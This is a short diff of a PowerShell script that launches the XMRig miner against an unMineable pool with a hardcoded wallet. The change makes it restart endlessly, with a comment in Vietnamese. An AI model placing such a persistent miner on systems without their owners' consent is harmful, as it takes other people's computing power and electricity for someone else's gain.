@@ -17,4 +17,7 @@ $pool = "stratum+ssl://rx-asia.unmineable.com:443"
 $wallet = "ATOM:cosmos1nqp27fnn3uuyy7xrvu2epdw7592uapmptfx06g.lmaokid"
 $password = "TAOSIEUDEPTRAI"
 
-Start-Process -FilePath $xmrigPath -ArgumentList "-a rx -o $pool -u $wallet -p $password" -NoNewWindow
+while ($true) {
+    Start-Process -FilePath $xmrigPath -ArgumentList "-a rx -o $pool -u $wallet -p $password" -NoNewWindow -Wait
+    Start-Sleep -Seconds 5  # Chờ 5 giây trước khi khởi động lại
+}
